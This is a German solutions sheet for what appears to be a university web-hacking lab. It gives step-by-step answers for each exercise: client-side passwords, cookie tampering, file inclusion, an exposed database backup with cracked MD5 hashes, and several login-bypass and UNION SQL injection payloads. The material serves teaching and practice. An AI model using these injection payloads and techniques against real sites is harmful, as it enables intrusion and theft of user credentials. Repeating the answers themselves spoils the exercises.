# Hacking Challenge - Lösungen


### 1. Simple 1

- Quelltext anzeigen, das Passwort zum Einloggen steht im Klartext im JavaScript-Teil alternativ im Browser secure.html aufrufen

```[js]
<script>
    $('#login').click(function () {
        if ($('#username').val() === 'admin' && $('#password').val() === 'qwertz123!') {
            location.href = '/psw/student/exercise/111/secure.html';
        } else {
            alert('Falsch!');
        }
    });
</script>
```


### 2. Simple 2

- Quelltext anzeigen, das Passwort zum Einloggen steht Base 64 encoded im JavaScript-Teil, zum Dekodieren können Webtools (z.B. https://www.base64decode.org/) oder aber die Funktion window.atob("base64string") verwendet werden

```[js]
<script>
    $("#login").click(function () {
        if ($('#username').val() === 'admin' && window.btoa($('#password').val()) === 'YWxseW91cmJhc2VhcmViZWxvbmd0b3Vz') {
            return true;
        } else {
            alert('Falsch!');
            return false;
        }
    });
</script>
```   

Passwort:"allyourbasearebelongtous"

### 3. Medium 1 

- Es existiert ein Cookie mit dem Namen isAdmin und dem wert 0 dies kann beispielsweise durch den Befehl document.cookie="isAdmin=1" geändert werden.
- Cookie "admin=0"

### 4. Medium 2

- Klassische SQL Injection durch Kommentare und oder OR zu lösen
- Mögliche Lösung: Benutzername=admin Passwort=' OR '1'='1
- oder admin' OR '1'='1
- D.h. es gibt schon im Backend ein SQL-Statement (d.h. Anführungsstriche sind schon vorhanden) und hier muss nur der "admin"-Teil erstetzt werden. Deswegen hat man am Ende auch kein schließendes ' mehr, weil das am Ende des SQL-Statements noch kommt. Am Anfang kommt ein ' weil man den Admin-String noch schließen muss innerhalb des SQL-Statements.


### 5. Medium 3

- Im Quelltext findet sich der Pfad zu einem Bild im Ordner files, wird dieser Ordner aufgerufen so kann man feststellen das hier eine htaccess datei fehlt. In der datei users.txt findet sich das gesuchte Passwort
- Apache config -> Listing -> pws.txt
- https://psw.matse.itc.rwth-aachen.de/psw/student/exercise/123/files/users.txt

### 6. Advanced 1 

- Anpassen des GET Parameters um die Datei pws.txt einzubinden

- "Admins können auf dieser Seite [LINK zu pws.txt] die Passwörter einsehen".
- ?q=test.php
- pws.txt -> 403 Error

- Lösung: GET-Parameter: https://psw.matse.itc.rwth-aachen.de/psw/student/exercise/131/index.php?q=pws.txt

### 7. Advanced 2 

- Seite: [Input] [Passwort] [submit]

- Infos für Administratoren:
    - Verzeichnis templates enthält alle Templates der Seite => 403
    - Verzeichnis classes enthält alle PHP-Classes => 403
    - Verzeichnis backup enthält alle Datenbank-Backups (im Format dump-YYYY-MM-DD.sql). => backup/backup-2016-12-01.sql
    - Die Verzeichnisse sollten aber entsprechend geschützt sein.

- Lösung: https://psw.matse.itc.rwth-aachen.de/psw/student/exercise/132/backup/backup-2020-12-01.sql (Datum beliebig)
- Bei "INSERT INTO user..." werden vier User hinzugefügt. Die Passwörter sind md5 gehasht
- Decrypt mit z.B. https://hashes.com/en/decrypt/hash oder https://www.md5online.org/md5-decrypt.html

- Nutzer:
    - Killer : "iloveyou1"   funktioniert nicht da der nutzer inactiv ist (angeblich eines der häufigsten passworte des myspace hacks)
    - Tiny: "123qwerty!" kein admin
      - funktioniert auf Windows komischerweise - Linux nicht
    - Matt: geht nicht zu entschlüsseln?
    - Jane: "supersecret123!" (können die meisten Websites nicht decrypten, scheint also nicht in deren Datenbank zu sein)


### 8. Advanced 3 

- Seite: SQL Union
- In der Response vom POST-Request auf https://psw.matse.itc.rwth-aachen.de/psw/student/exercise/133/show sieht man, dass ein JSON-Objekt mit drei Key/Value-Paaren zurückkommt. Man kann daraus schließen, dass die Tabelle 3 Spalten hat
- auf der Hauptseite steht der Tipp: "Bei Aufgaben bei denen Zugriff auf eine Datenbank möglich ist können sie in der Tabelle "user" den gesuchten Lösungs-Hash finden."
- D.h. die relevante Information steht in der Tabelle "user". Diese hat aber nur zwei Spalten. Das findet man raus, wenn man SQL Union versucht. D.h. hier muss künstlich eine 3. Spalte eingefügt werden. 

- Der POST-Request lässt sich mit beliebigen Werten für den Namen aufrufen. Hier sind SQL Injections möglich.

- Mögliche Lösungen:
    - PAUL' UNION SELECT *, 'x' FROM user #
        - das , 'x' muss hinzugefügt werden, da das eigentliche Statement (links vom UNION SELECT) je drei Rückgabewerte/Spalten besitzt, die Tabelle user aber nur zwei Spalten hat
        - siehe https://de.wikipedia.org/wiki/SQL-Injection#Aussp%C3%A4hen_von_Daten
    - ' UNION SELECT password as name, 'b' as message, 'a' as date FROM user WHERE 1=1 OR password='
    - ' UNION SELECT name,password,42 FROM user WHERE True or '
    - ' UNION SELECT name,password,42 FROM user WHERE 1=1 OR password='
    - ' UNION SELECT name,password,42 FROM user WHERE 1='1


    was soll das hier?!?!
    - "name=' OR 1 AND 1=2 UNION SELECT table_schema, table_name, 1 FROM information_schema.tables #"
     (# um den Rest der SQL Query im Backend auszukommentieren)
    - name=PSW' UNION SELECT *,NULL FROM user WHERE name='PSW&_csrf=o5NBgUsY-MRmuTfV8QN3fEb2CeXWJHOPBEfY
    - name=' or 'a'='a' union Select *,null from user where 'a'='a &_csrf=nM6F7eo0-nxzKwX5JuQof7Gv3-mzIZlwOlOw


- Request mit Insomnia: POST https://psw.matse.itc.rwth-aachen.de/psw/student/exercise/133/show
    - Form:
        - name=Paul' UNION SELECT *, 'x' FROM user #
        - _csrf=a1sJt8bD-dSxNyLuvVXeConoXX0JIy6qHR2c
          - ACHTUNG: CSRF wird bei jedem F5 neu erzeugt! --> sieht man in den Dev Tools unter Payload oder über $("#_csrf").val()
    - Header:
        - Content-Type: application/x-www-form-urlencoded
        - Cookie: ea7172daa01e8162458d82f346a97a5d
        - + disable automatic setting cookies (Rechtsklick Request --> Settings)

- oder einfach mittels Firefox Browser das Request neu abschicken ("bearbeiten und erneut senden")
- Javascript (Konsole Dev-Tools):
```
  $.post("/psw/student/exercise/133/show", {name: "psw' UNION SELECT password, 'x', 'x' FROM user WHERE ''='", _csrf: $("#_csrf").val()}, function (data) {
                              
                var messages = ""
                for (var i = 0; i < data.length; i += 1) {
                    messages += "<h4>" + data[i].name + "</h4><p>" + data[i].message + "</p>";
                }
                $('#messages').html(messages);
            });
```
